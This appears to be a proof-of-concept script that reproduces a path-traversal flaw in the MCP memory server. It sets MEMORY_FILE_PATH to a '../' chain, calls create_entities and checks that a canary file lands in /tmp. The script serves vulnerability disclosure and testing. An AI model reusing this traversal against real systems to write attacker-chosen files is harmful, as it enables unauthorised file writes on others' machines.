import { spawn } from 'child_process';
import path from 'path';
import fs from 'fs';
import os from 'os';

const SERVER_PATH = path.resolve('node_modules/@modelcontextprotocol/server-memory/dist/index.js');
const dir = path.dirname(SERVER_PATH);
const depth = dir.split(path.sep).filter(Boolean).length;
const traversal = '../'.repeat(depth);

// Target: a canary file OUTSIDE the intended memory storage directory,
// simulating write access to an arbitrary, attacker-chosen path.
const canaryRelTarget = traversal + 'tmp/vata_dsc_memory_traversal_canary.jsonl';
const expectedAbsPath = '/tmp/vata_dsc_memory_traversal_canary.jsonl';

// Clean up any prior run
try { fs.unlinkSync(expectedAbsPath); } catch {}

console.log(`Server entry: ${SERVER_PATH}`);
console.log(`Traversal depth: ${depth}`);
console.log(`MEMORY_FILE_PATH (relative, attacker-controlled): ${canaryRelTarget}`);
console.log(`Expected escape target: ${expectedAbsPath}`);
console.log('');

const proc = spawn('node', [SERVER_PATH], {
  env: { ...process.env, MEMORY_FILE_PATH: canaryRelTarget },
  stdio: ['pipe', 'pipe', 'pipe'],
});

let buffer = '';
proc.stdout.on('data', (chunk) => { buffer += chunk.toString(); });
proc.stderr.on('data', (chunk) => { console.log('[server stderr]', chunk.toString().trim()); });

function sendMessage(msg) {
  const json = JSON.stringify(msg);
  proc.stdin.write(json + '\n');
}

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  await sleep(500);

  // MCP initialize handshake
  sendMessage({
    jsonrpc: '2.0', id: 1, method: 'initialize',
    params: {
      protocolVersion: '2024-11-05',
      capabilities: {},
      clientInfo: { name: 'vata-dsc-repro', version: '1.0.0' },
    },
  });
  await sleep(500);

  sendMessage({ jsonrpc: '2.0', method: 'notifications/initialized' });
  await sleep(300);

  // Real tool call: create_entities, exactly as a legitimate agent would invoke it
  sendMessage({
    jsonrpc: '2.0', id: 2, method: 'tools/call',
    params: {
      name: 'create_entities',
      arguments: {
        entities: [{
          name: 'VATA_DSC_CANARY',
          entityType: 'traversal_test',
          observations: ['This entity was written via MEMORY_FILE_PATH path traversal — VATA DSC live repro'],
        }],
      },
    },
  });
  await sleep(1000);

  proc.kill();

  console.log('--- Raw server responses ---');
  console.log(buffer);

  console.log('\n--- Filesystem check ---');
  if (fs.existsSync(expectedAbsPath)) {
    const content = fs.readFileSync(expectedAbsPath, 'utf-8');
    console.log(`CONFIRMED: file written outside intended install directory.`);
    console.log(`Path: ${expectedAbsPath}`);
    console.log(`Content:\n${content}`);
  } else {
    console.log(`File not found at ${expectedAbsPath} — traversal may not have executed as expected.`);
  }
}

main();
